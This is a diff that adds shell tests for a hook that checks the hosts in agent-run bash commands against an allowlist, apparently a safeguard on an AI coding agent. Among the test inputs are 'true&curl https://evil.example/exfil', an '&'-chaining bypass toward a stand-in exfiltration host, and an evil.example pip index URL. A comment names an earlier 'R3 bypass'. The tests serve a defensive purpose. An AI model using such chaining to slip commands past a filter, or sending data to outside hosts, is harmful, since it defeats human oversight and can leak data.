@@ -586,6 +586,69 @@ _call_hook_other() {
   echo "$output" | jq -er '.reason' | grep -qE 'implicit host|index-url|registry'
 }
 
+@test "AC-2 (Codex C1): 'npm install --registry=https://X' parses host from inside flag-value" {
+  # Previously --registry=https://registry.npmjs.org was a single token;
+  # _host_from_url anchored on ^scheme:// failed to match. Pip/npm/etc.
+  # case now peels --<flag>=VALUE before extraction.
+  echo 'registry.npmjs.org' > "$ALLOWLIST"
+  run _call_hook_bash 'npm install left-pad --registry=https://registry.npmjs.org'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex C1): 'pip install --index-url=https://X foo' parses host from flag-value" {
+  echo 'pypi.org' > "$ALLOWLIST"
+  run _call_hook_bash 'pip install --index-url=https://pypi.org/simple requests'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex C1): 'pip install --index-url=https://evil.example foo' STILL blocks non-allowlisted host" {
+  echo 'pypi.org' > "$ALLOWLIST"
+  run _call_hook_bash 'pip install --index-url=https://evil.example/simple requests'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+# ---------------------------------------------------------------------------
+# Codex C2: quote-aware segment splitting
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (Codex C2): single-quoted URL with & in query string stays one segment" {
+  # Previously `&`-split tokenized this as TWO segments:
+  #   curl 'https://api.github.com/x?q=a
+  #   per_page=1'
+  # First missing closing quote → host extraction failed → block. Now
+  # quote-aware split keeps the URL intact + host extracts cleanly.
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash "curl 'https://api.github.com/search?q=foo&per_page=1'"
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex C2): double-quoted URL with & in query string stays one segment" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'curl "https://api.github.com/search?q=foo&per_page=1"'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (Codex C2): unquoted '&' between commands STILL splits (R3 fix preserved)" {
+  # The R3 bypass case must still be blocked — `&` outside quotes is a
+  # real separator + the second segment must be inspected.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'true&curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (Codex C2): '&&' chain still splits correctly" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'cd /tmp && curl https://api.github.com/x'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
 @test "AC-2: npm install foo (implicit registry) → fail-CLOSED block" {
   : > "$ALLOWLIST"
   run _call_hook_bash 'npm install lodash'
